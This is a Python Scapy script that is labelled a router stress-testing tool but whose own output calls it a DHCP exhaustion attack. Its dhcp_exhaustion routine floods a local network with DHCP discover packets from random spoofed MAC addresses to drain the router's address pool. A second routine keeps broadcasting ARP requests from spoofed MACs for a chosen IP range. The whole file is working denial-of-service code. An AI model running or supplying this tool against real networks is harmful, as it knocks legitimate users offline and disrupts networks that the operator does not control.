from scapy.all import *
import random
import time
import threading

def generate_random_mac():
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def dhcp_exhaustion(num_devices, interface):
    print(f"[*] Starting DHCP exhaustion attack with {num_devices} devices")
    
    for i in range(num_devices):
        mac = generate_random_mac()
        dhcp_options = [("message-type", "discover"),
                        ("max_dhcp_size", 1500),
                        ("client_id", mac),
                        "end"]
        
        packet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                 IP(src="0.0.0.0", dst="255.255.255.255") / \
                 UDP(sport=68, dport=67) / \
                 BOOTP(chaddr=[mac]) / \
                 DHCP(options=dhcp_options)

        sendp(packet, iface=interface, verbose=0)
        print(f"[+] Sent DHCP request from MAC: {mac}")

def keep_alive_traffic(base_ip, num_devices, interface):
    print(f"[*] Starting keep-alive traffic for {num_devices} devices")
    
    while True:
        for i in range(1, num_devices + 1):
            ip = f"{base_ip}{i}"
            mac = generate_random_mac()
            
            # Send ARP packet
            arp_packet = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                         ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)
            
            sendp(arp_packet, iface=interface, verbose=0)
            print(f"[+] Sent ARP announcement for IP: {ip}")
            time.sleep(0.1)

        time.sleep(5)  # Sleep between cycles

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Router stress testing tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-d", "--dhcp", type=int, help="Number of DHCP clients to simulate")
    parser.add_argument("-k", "--keep-alive", action="store_true", help="Enable keep-alive traffic")
    parser.add_argument("-b", "--base-ip", help="Base IP for keep-alive traffic (e.g., 192.168.1.)")
    
    args = parser.parse_args()

    if args.dhcp:
        dhcp_exhaustion(args.dhcp, args.interface)

    if args.keep_alive:
        if not args.base_ip or not args.dhcp:
            print("[!] Need both --base-ip and --dhcp arguments for keep-alive")
            sys.exit(1)
            
        # Start keep-alive traffic in a separate thread
        threading.Thread(target=keep_alive_traffic, 
                         args=(args.base_ip, args.dhcp, args.interface),
                         daemon=True).start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping keep-alive traffic")